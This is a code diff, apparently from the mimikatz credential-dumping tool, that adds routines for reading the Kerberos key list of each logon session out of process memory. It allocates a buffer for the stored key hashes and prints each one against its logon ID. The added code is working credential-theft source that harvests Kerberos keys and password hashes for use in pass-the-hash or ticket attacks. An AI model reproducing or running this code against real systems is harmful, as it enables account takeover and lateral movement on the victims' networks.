@@ -52,6 +52,9 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 {
 	KIWI_KERBEROS_LOGON_SESSION session;
 	UNICODE_STRING pinCode;
+	KIWI_KERBEROS_KEYS_LIST_6 keyList;
+	PKERB_HASHPASSWORD_6 pHashPassword;
+	DWORD i;
 	ULONG_PTR ptr;
 	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier), pData->LogonId))
 	{
@@ -61,6 +64,18 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 			if(session.pinCode)
 				if(ReadMemory((ULONG_PTR) session.pinCode, &pinCode, sizeof(UNICODE_STRING), NULL))
 					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
+			if(session.pKeyList)
+				if(ReadMemory((ULONG_PTR) session.pKeyList, &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6) - sizeof(KERB_HASHPASSWORD_6), NULL))
+					if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6)))
+					{
+						if(ReadMemory((ULONG_PTR) session.pKeyList + sizeof(KIWI_KERBEROS_KEYS_LIST_6) - sizeof(KERB_HASHPASSWORD_6), pHashPassword, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6), NULL))
+						{
+							dprintf("\n\t * Key List");
+							for(i = 0; i < keyList.cbItem; i++)
+								kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST);
+						}
+						LocalFree(pHashPassword);
+					}
 		}
 	}
 	else dprintf("KO");
